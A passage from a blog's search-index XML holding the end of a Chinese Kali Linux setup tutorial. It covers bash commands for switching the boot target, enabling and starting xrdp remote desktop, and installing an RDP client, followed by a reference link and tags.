class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令行启动</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl set-default multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图形化界面启动</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl set-default graphical.target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置开机自启</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> xrdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动与关闭</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start xrdp</span><br><span class="line"><span class="built_in">sudo</span> systemctl stop xrdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 避免ssl证书无法验证，将xrdp用户加入ssl-cert用户组</span></span><br><span class="line"><span class="built_in">sudo</span> adduser xrdp ssl-cert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置后记得重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>​安装远程连接xrdp的客户端（二选一即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gnome-boxes</span><br><span class="line"><span class="built_in">sudo</span> apt install remmina</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.bilibili.com/read/cv22949847/">Kali 更换国内源（全部版本通用） - 哔哩哔哩 (bilibili.com)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
            <tag> 教程 </tag>
            
            <tag> 安装 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
